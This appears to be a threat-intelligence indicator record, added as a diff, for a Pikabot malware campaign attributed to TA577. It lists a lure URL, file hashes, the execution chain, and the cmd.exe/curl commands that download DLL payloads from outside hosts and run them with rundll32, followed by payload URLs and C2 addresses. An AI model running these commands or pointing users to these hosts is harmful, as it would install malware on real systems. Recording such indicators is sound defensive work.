@@ -1,0 +1,63 @@
+15.12.2023 | Pikabot | TA577 | 1.1.17-ghost
+
+*************************************************
+
+.url https://sleepwell.cl/wlq/?1337
+.zip 7ca88e18dd24b45d65953f7d4bd9ab5b6a4c92797519f08c9a7a57c0b0ad8a81
+.dll 3f106cb6aa41040505b005d2d8b0f02a47d8be28cba0a1fc740782f674bce0a8
+
+*************************************************
+
+url > zip > js > curl > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Novdt.js
+
+cmd.exe /c mkdir  C:\Gkooegsglitrg\Dkrogirbksri & curl https://keebling.com/Y0j85XT/0.535636157609684.dat --output C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll
+
+cmd.exe /c mkdir  C:\Gkooegsglitrg\Dkrogirbksri & curl https://baumbachers.com/WDmfb/0.0697576491133986.dat --output C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll
+
+cmd.exe /c mkdir  C:\Gkooegsglitrg\Dkrogirbksri & curl https://ionister.com/TS1m/0.8189976546523916.dat --output C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll
+
+cmd.exe /c mkdir  C:\Gkooegsglitrg\Dkrogirbksri & curl 0.055009107142406366.dat --output C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll
+
+cmd.exe /c mkdir  C:\Gkooegsglitrg\Dkrogirbksri & curl 0.9591382201125718.dat --output C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll
+
+cmd.exe /c mkdir  C:\Gkooegsglitrg\Dkrogirbksri & curl 0.8227679311528576.dat --output C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll
+
+cmd.exe /c timeout 10 & rundll32 C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll,Enter
+
+timeout  10 
+
+rundll32 C:\Gkooegsglitrg\Dkrogirbksri\Wkkfgujbsrbuj.dll,Enter
+
+*************************************************
+
+**** .dll distro ****
+
+https://keebling.com/Y0j85XT/0.535636157609684.dat
+https://baumbachers.com/WDmfb/0.0697576491133986.dat
+https://ionister.com/TS1m/0.8189976546523916.dat
+
+*************************************************
+
+c2's
+
+57.128.164.11:5242
+172.232.173.141:2226
+45.76.98.136:2221
+51.83.253.102:9785
+57.128.109.221:13724
+141.95.108.252:2078
+57.128.108.132:13785
+154.211.12.126:2967
+
+https://57.128.164.11:5242/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://172.232.173.141:2226/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://45.76.98.136:2221/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://51.83.253.102:9785/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://57.128.109.221:13724/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://141.95.108.252:2078/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://57.128.108.132:13785/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+https://154.211.12.126:2967/MegazoosporeOmnigerent/7Yt6SQKVAaTrIFZ?Telescopist=Bdb6Fsmf1lbgV&UnworshippedProlificacy=Defrayer&redenyingLandocrat=hosing
+
+*************************************************
